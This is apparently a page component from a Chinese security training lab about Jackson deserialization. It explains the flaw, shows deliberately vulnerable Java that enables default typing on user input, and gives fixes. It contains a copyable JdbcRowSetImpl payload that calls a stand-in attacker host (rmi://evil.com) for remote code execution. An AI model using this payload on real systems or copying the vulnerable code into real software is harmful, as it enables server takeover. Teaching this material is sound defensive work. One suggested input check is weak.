<template>
  <vuln-template
    title="Jackson反序列化"
    subtitle="Jackson Deserialization"
    level="严重"
    :icon="ApiOutlined"
    moduleKey="jackson"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>Jackson</strong>是Java中最流行的JSON处理库,当启用多态类型处理(enableDefaultTyping)时可能存在反序列化漏洞。
      </a-typography-paragraph>
      <a-typography-paragraph>
        Jackson反序列化漏洞的危害：
      </a-typography-paragraph>
      <ul>
        <li>通过@type或@class指定恶意类</li>
        <li>远程代码执行</li>
        <li>绕过类型检查</li>
        <li>影响Spring Boot等主流框架</li>
      </ul>
      <a-typography-paragraph>
        漏洞主要出现在使用enableDefaultTyping()方法时。
      </a-typography-paragraph>
    </template>

    <template #payload>
      <a-typography-paragraph>
        常见的Jackson攻击payload：
      </a-typography-paragraph>
      <a-typography-paragraph code copyable>
        ["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://evil.com/Exploit","autoCommit":true}]
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">通过JdbcRowSetImpl执行RCE</span>
      </a-space>
      
      <a-typography-paragraph code copyable style="margin-top: 12px">
        ["org.apache.commons.configuration.ConfigurationMap",{"configurationList":[...]}]
      </a-typography-paragraph>
      <a-space direction="vertical" style="width: 100%">
        <span style="color: #95a5a6">通过ConfigurationMap触发漏洞</span>
      </a-space>

      <a-alert
        message="避免使用enableDefaultTyping(),使用白名单机制！"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #test-form>
      <div class="json-process-container">
        <a-card title="JSON数据处理服务" :bordered="false" style="margin-bottom: 24px;">
          <a-typography-paragraph>
            输入JSON格式的数据，系统将使用Jackson库为您解析和处理。
          </a-typography-paragraph>
        </a-card>
        
        <a-form :model="formState" @finish="handleSubmit" layout="vertical">
          <a-form-item
            label="JSON数据"
            name="content"
            :rules="[{ required: true, message: '请输入JSON数据' }]"
          >
            <a-textarea
              v-model:value="formState.content" :rows="6"
              size="large"
              placeholder="输入JSON格式的数据"
            />
          </a-form-item>

          <a-form-item>
            <a-space>
              <a-button type="primary" html-type="submit" size="large" :loading="loading">
                <template #icon><api-outlined /></template>
                解析JSON
              </a-button>
              <a-button size="large" @click="handleReset">
                <template #icon><redo-outlined /></template>
                重置
              </a-button>
            </a-space>
          </a-form-item>
        </a-form>
      </div>
    </template>

    <template #result v-if="result">
      <div class="result-content">
        <pre style="margin: 0;">{{ result }}</pre>
      </div>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@RestController
@RequestMapping("/home/jackson")
public class Jackson {
    @RequestMapping("")
    public String vul(@RequestBody String content) {
        try {
            ObjectMapper mapper = new ObjectMapper();
            // 漏洞：启用了多态类型处理，允许反序列化任意类
            mapper.enableDefaultTyping();
            // 等同于：mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
            
            // 漏洞：直接反序列化用户输入的JSON
            // 攻击者可以通过数组格式指定类名，如：["com.sun.rowset.JdbcRowSetImpl", {...}]
            Object o = mapper.readValue(content, Object.class);
            mapper.writeValueAsString(o);
            return "解析成功！";
        } catch (Exception e) {
            return e.toString();
        }
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：enableDefaultTyping()启用了多态类型处理，允许JSON中通过数组格式指定类名。攻击者可以指定恶意类（如JdbcRowSetImpl），配合JNDI注入实现远程代码执行。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>禁用DefaultTyping：</strong>不要使用enableDefaultTyping()方法</li>
        <li><strong>使用@JsonTypeInfo：</strong>使用注解方式控制多态类型，而不是全局启用</li>
        <li><strong>白名单机制：</strong>如果必须使用，配置严格的类白名单</li>
        <li><strong>输入验证：</strong>检查JSON是否包含数组格式的类名</li>
        <li><strong>升级版本：</strong>使用较新版本的Jackson，默认更安全</li>
      </ul>
      
      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode1" style="margin: 0;">
          <pre class="code-block"><code>// 错误示例(易受攻击)
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping(); // 启用多态类型，危险！
Object o = mapper.readValue(content, Object.class);</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode2" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例1：禁用DefaultTyping（推荐）
        @RequestMapping("")
        public String vul(@RequestBody String content) {
            ObjectMapper mapper = new ObjectMapper();
            // 不调用enableDefaultTyping()，默认禁用多态类型
            Map&lt;String, Object&gt; map = mapper.readValue(content, Map.class);
            return map.get("name").toString();
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode3" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例2：使用@JsonTypeInfo注解（如果必须使用多态）
        @JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY)
        @JsonSubTypes({
            @JsonSubTypes.Type(value = Dog.class, name = "dog"),
            @JsonSubTypes.Type(value = Cat.class, name = "cat")
        })
        public abstract class Animal {
            // 只允许预定义的子类
}</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode4" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例3：使用PolymorphicTypeValidator（Jackson 2.10+）
        import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;
        
        ObjectMapper mapper = new ObjectMapper();
        PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
            .allowIfSubType("com.example.model") // 只允许特定包下的类
            .build();
mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);</code></pre>
      </a-typography-paragraph>
      </div>
      
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode5" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例4：输入验证
        @RequestMapping("")
        public String vul(@RequestBody String content) {
            // 检查是否包含数组格式的类名
            if (content.startsWith("[") && content.contains(",")) {
                throw new SecurityException("不允许多态类型反序列化");
            }
            
            ObjectMapper mapper = new ObjectMapper();
            Map&lt;String, Object&gt; map = mapper.readValue(content, Map.class);
            return map.get("name").toString();
}</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import { ApiOutlined, RedoOutlined } from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')

const sourceCode = `@RestController
@RequestMapping("/home/jackson")
public class Jackson {
    @RequestMapping("")
    public String vul(@RequestBody String content) {
        try {
            ObjectMapper mapper = new ObjectMapper();
            // 漏洞：启用了多态类型处理，允许反序列化任意类
            mapper.enableDefaultTyping();
            // 等同于：mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
            
            // 漏洞：直接反序列化用户输入的JSON
            // 攻击者可以通过数组格式指定类名，如：["com.sun.rowset.JdbcRowSetImpl", {...}]
            Object o = mapper.readValue(content, Object.class);
            mapper.writeValueAsString(o);
            return "解析成功！";
        } catch (Exception e) {
            return e.toString();
        }
    }
}`

const fixCode1 = `// 错误示例(易受攻击)
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping(); // 启用多态类型，危险！
Object o = mapper.readValue(content, Object.class);`

const fixCode2 = `// 正确示例1：禁用DefaultTyping（推荐）
@RequestMapping("")
public String vul(@RequestBody String content) {
    ObjectMapper mapper = new ObjectMapper();
    // 不调用enableDefaultTyping()，默认禁用多态类型
    Map<String, Object> map = mapper.readValue(content, Map.class);
    return map.get("name").toString();
}`

const fixCode3 = `// 正确示例2：使用@JsonTypeInfo注解（如果必须使用多态）
@JsonTypeInfo(use = JsonTypeInfo.Id.NAME, include = JsonTypeInfo.As.PROPERTY)
@JsonSubTypes({
    @JsonSubTypes.Type(value = Dog.class, name = "dog"),
    @JsonSubTypes.Type(value = Cat.class, name = "cat")
})
public abstract class Animal {
    // 只允许预定义的子类
}`

const fixCode4 = `// 正确示例3：使用PolymorphicTypeValidator（Jackson 2.10+）
import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;

ObjectMapper mapper = new ObjectMapper();
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("com.example.model") // 只允许特定包下的类
    .build();
mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);`

const fixCode5 = `// 正确示例4：输入验证
@RequestMapping("")
public String vul(@RequestBody String content) {
    // 检查是否包含数组格式的类名
    if (content.startsWith("[") && content.contains(",")) {
        throw new SecurityException("不允许多态类型反序列化");
    }
    
    ObjectMapper mapper = new ObjectMapper();
    Map<String, Object> map = mapper.readValue(content, Map.class);
    return map.get("name").toString();
}`

const formState = reactive({
  content: ''
})

const handleSubmit = async () => {
  loading.value = true
  try {
    const response = await axios.get('/home/jackson', {
      params: formState
    })
    result.value = response.data
    message.success('测试完成')
  } catch (error) {
    message.error('测试失败：' + (error.response?.data || error.message))
  } finally {
    loading.value = false
  }
}

const handleReset = () => {
  formState.content = ''
  result.value = ''
}
</script>
